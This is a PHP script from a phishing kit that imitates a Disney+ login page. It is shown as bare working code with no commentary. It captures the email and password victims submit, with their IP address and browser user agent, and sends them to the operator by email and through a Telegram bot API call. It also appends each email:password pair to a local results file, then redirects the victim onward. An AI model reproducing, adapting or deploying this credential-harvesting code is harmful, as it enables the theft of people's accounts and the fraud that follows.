<?php
  error_reporting(0);
  ob_start();
  session_start();
include '../../email.php';
include '../../nword.php';
$filepath = '../../panel/stats.ini';
$data = @parse_ini_file($filepath);
$data['logs']++;
            function update_ini_file($data, $filepath) {
              $content = "";
              $parsed_ini = parse_ini_file($filepath, true);
              foreach($data as $section => $values){
                if($section === ""){
                  continue;
                }
                $content .= $section ."=". $values . "\n\r";
              }
              if (!$handle = fopen($filepath, 'w')) {
                return false;
              }
              $success = fwrite($handle, $content);
              fclose($handle);
            }
update_ini_file($data, $filepath);

if($_SERVER['REQUEST_METHOD'] == 'POST'){
  $_SESSION['email']  = $_POST['mail'];
  $_SESSION['pass']   = $_POST['pass'];
	

$message = "

 ㅤ
[🔒] Informations de connexion [🔒]

🚪 E-Mail : ".$_SESSION['email']."
🗝 Mot de passe : ".$_SESSION['pass']."

🛒 Adresse IP : "._ip()."
🛒 User Agent : ".$_SERVER['HTTP_USER_AGENT']."
ㅤ
";


$Subject=" 「🎰」+1 Fr3sh Disney+ login from ".$_SESSION['email']." | "._ip();
$head="From: (っ◔◡◔)っDisneyMiauw 🍓 <info@sdf.cash>";
mail($my_mail,$Subject,$message,$head);
$html = file_get_contents('https://api.telegram.org/bot'.$bot_token.'/sendMessage?chat_id='.$group_id.'&text='.urlencode("$message").'');
$fil = fopen('./rez_txt/rez_login.txt','a+');
	     fwrite($fil, ''.$_SESSION["email"].':'.$_SESSION["pass"]."\n");
$_SESSION['step_one']  = true;
header('location: ../warning.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));

}
else
{
  header('location: ../../login.php');
}

?>